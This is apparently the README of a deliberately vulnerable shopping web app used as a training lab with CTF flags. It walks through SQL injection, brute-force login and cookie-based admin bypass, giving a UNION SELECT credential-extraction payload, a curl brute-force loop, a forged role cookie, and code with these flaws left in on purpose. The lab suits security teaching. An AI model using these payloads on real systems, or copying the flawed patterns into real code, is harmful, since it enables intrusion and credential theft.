# 🛒 ShopEasy — Intentionally Vulnerable Web App
## ⚠️ For Cybersecurity Training Purposes ONLY

> This application contains deliberate security vulnerabilities. Do NOT deploy on public servers or production environments.

---

## 📁 Project Structure

```
files/
├── app.py               # Flask API (vulnerable)
├── setup_db.py          # Database initialization
├── requirements.txt
├── api/
│   └── index.py         # Vercel Python function entrypoint
├── index.html
├── main.jsx
├── App.jsx
├── LoginPage.jsx
├── ProductsPage.jsx
├── AdminDashboard.jsx
├── App.css
├── vite.config.js
├── package.json
└── vercel.json
```

---

## 🚀 Setup Instructions

### Local Development (Recommended)

```bash
cd d:\files

# Create virtual environment (first time only)
python3 -m venv venv
source venv/bin/activate        # Mac/Linux
# venv\Scripts\activate         # Windows

# Install dependencies
pip install -r requirements.txt

# Initialize the database
python setup_db.py

# Start Flask API server (Terminal 1)
python app.py
# → Running on http://localhost:5000

# Install frontend dependencies (first time only)
npm install

# Start frontend dev server with /api proxy (Terminal 2)
npm run dev
# → Running on http://localhost:3000
```

Open **http://localhost:3000** in your browser.

The dev proxy in `vite.config.js` forwards `/api/*` to `http://127.0.0.1:5000`, so the same frontend API paths work locally and in Vercel.

---

## ▲ Deploying On Vercel (Root Project)

This project is now configured for Vercel with:

- Frontend static build via Vite (`dist/`)
- Flask backend as a Python serverless function at `/api/*`
- SPA fallback routing for React app navigation

### Quick Deploy

```bash
# from project root
npm install
npm run build

# optional local run
vercel dev

# deploy
vercel --prod
```

### Important Notes

- In Vercel, SQLite data is created in `/tmp` at runtime and is ephemeral.
- API calls are relative (`/api/...`) so both local proxy/dev and deployed origin work.
- Entry file is `main.jsx` and `index.html` points to `/main.jsx`.

---

## 🔓 Vulnerability Walkthroughs

## 🏁 CTF Flag Mode

This lab now issues **random flags on each backend start** for each exploit path:

- SQL Injection flag
- Brute Force Login flag
- Cookie Authorization Bypass flag

Flags are returned only when the matching vulnerability is successfully exploited.

### Validator API

Validators can check submitted flags and see which vulnerability was solved:

```bash
curl -X POST http://localhost:5000/api/ctf/validate \
  -H "Content-Type: application/json" \
  -d '{"flag":"FLAG{...}"}'
```

Successful response:

```json
{
  "valid": true,
  "vulnerability": "SQL Injection"
}
```

## 🧭 Student Manual Approach (No Auto Tools)

Use this app like a real tester would: map first, test second.

1. Explore normal behavior first
2. Capture all API calls from browser DevTools Network tab
3. Build a route map: page -> action -> endpoint -> response
4. Identify trust boundaries: input fields, query params, cookies, hidden routes
5. Test authentication behavior (login messages, retries, brute-force signals)
6. Test authorization behavior (admin access and role checks)
7. Test input handling (especially product search)
8. Record each finding with proof: request, response, impact, fix

### Route Map For This App

| Feature | Endpoint | What to test |
|---------|----------|--------------|
| Login | `POST /api/login` | Error leakage, brute-force weakness |
| Product list | `GET /api/products` | Data exposure and auth assumptions |
| Product search | `GET /api/products/search?q=...` | Input handling and injection |
| Admin panel | `GET /api/admin` | Authorization and cookie trust |
| Logout | `POST /api/logout` | Session/cookie lifecycle |

### Vulnerabilities Present In This App

1. SQL Injection risk in product search (`/api/products/search`)
2. Brute-force weakness (no rate limit/lockout)
3. User enumeration via specific login error messages
4. Broken access control by trusting `role` cookie for admin
5. Insecure client-readable session cookies (`httponly=False`)
6. Plain-text password storage in SQLite

---

### 1. 💉 SQL Injection (Search Field)

**Input:** Product search

**Vulnerable code (`app.py`):**
```python
query = "SELECT name, price FROM products WHERE name LIKE '%" + search + "%'"
```

**Payload:**
```
' UNION SELECT username,password FROM staff_accounts--
```

**Outcome:**

👉 Extract sensitive database data (user credentials)

✔ This is a data breach issue, not a login issue.

---

### 2. 🔨 Brute Force Attack (Login)

**Issue:** No rate limiting

**Tool:** Burp Intruder

**Outcome:**

👉 Gain access to a normal user account only

✔ Important change:
- ❌ Do NOT allow admin login via brute force
- ✔ Only normal user credentials should be guessable
- ✔ Brute-force uses a separate lab credential pool (not SQLite users table)
- ✔ One active username/password pair is randomly selected from that pool per app start

### Brute Force Wordlists

Use these files for Burp Intruder:

- `data/wordlists/usernames.txt`
- `data/wordlists/passwords.txt`

The active valid brute-force pair is one random username/password combination from those files.

**Wordlist candidates (example usernames):**
| Username | Password  |
|----------|-----------|
| lab_guest_104   | (wordlist guess) |
| student_run_77  | (wordlist guess) |
| trial_user_51   | (wordlist guess) |
| ops_read_33     | (wordlist guess) |
| qa_user_19      | (wordlist guess) |

**How to exploit with Burp Suite:**
1. Open Burp Suite → Proxy → Intercept
2. Submit login with any username
3. Send request to Intruder
4. Set payload position on the `password` field
5. Load a wordlist (e.g., rockyou.txt)
6. Start attack — look for responses with `"success": true`

**With curl:**
```bash
# Test single credential
curl -X POST http://localhost:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password1"}'

# Brute force script
for pass in "123456" "password" "password1" "letmein" "qwerty"; do
  echo -n "Trying $pass: "
  curl -s -X POST http://localhost:5000/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"alice\",\"password\":\"$pass\"}" | grep -o '"message":"[^"]*"'
  echo
done
```

---

### 3. 🍪 Cookie Manipulation

**Cookie:**

```text
role=user
```

**Modify:**

```text
role=admin
```

**Vulnerable code (`app.py`):**
```python
if request.cookies.get("role") == "admin":
    show_admin_panel()
```

**Outcome:**

👉 Access hidden admin UI (feature exposure, not authentication)

✔ Clarification:
- User is already logged in
- This is authorization bypass, not login

**With curl:**
```bash
curl http://localhost:5000/api/admin \
  -H "Cookie: role=admin"
```

After changing `role` to `admin`, refresh the app and it will open the admin view.

---

## 🗄️ Database Schema

```sql
-- Users (passwords in plain text)
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL UNIQUE,
    password TEXT NOT NULL
);

-- Products
CREATE TABLE products (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT NOT NULL,
    price REAL NOT NULL
);
```

---

## 🧪 Quick Test Cheat Sheet

| Attack               | Payload / Action                                              |
|----------------------|---------------------------------------------------------------|
| SQL Injection        | `' UNION SELECT username,password FROM users--`               |
| Brute Force          | Burp Intruder with separate lab username/password wordlists    |
| Cookie Manipulation  | Change `role` cookie from `user` to `admin`                   |

---

## ⚠️ Disclaimer

This application is intentionally insecure and is designed solely for educational and training purposes in controlled environments. Do not expose it to the internet or use it in production. The authors are not responsible for any misuse.
